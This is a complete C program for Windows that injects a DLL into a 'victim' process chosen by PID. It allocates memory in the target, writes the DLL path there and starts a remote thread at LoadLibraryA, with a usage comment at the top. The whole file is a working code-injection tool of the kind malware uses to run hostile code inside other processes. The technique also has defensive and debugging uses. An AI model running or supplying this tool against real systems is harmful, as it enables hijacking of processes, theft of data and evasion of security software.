//This code injects a chosen dll to a chosen process
//The usage of the code is - <ExeFile> <VictimProcessPid> <DllFile>

#include <stdio.h>
#include <Windows.h>
#include <tchar.h>

int main(int argc, const char* argv[])
{
	if (argc < 3)
	{
		_tprintf(_T("Please enter <pid> <dllpath>\n"));
		return 0;
	}
	int pid = atoi(argv[1]);
	HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION, NULL, pid);

	if (!hProcess)
	{
		_tprintf(_T("Cant open target process\n"));
		return 0;
	}

	void* buffer = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buffer)
	{
		_tprintf(_T("Cant allocate memory in target process\n"));
		CloseHandle(hProcess);
		return 0;
	}
	WriteProcessMemory(hProcess, buffer, argv[2], strlen(argv[2]), NULL);
	LPTHREAD_START_ROUTINE start = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(_T("kernel32")),("LoadLibraryA"));
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, start, buffer, NULL, NULL);
	if (!hThread)
	{
		_tprintf(_T("Cant create thread in target process\n"));
		CloseHandle(hProcess);
		return 0;
	}
	CloseHandle(hProcess);
	return 1;
}
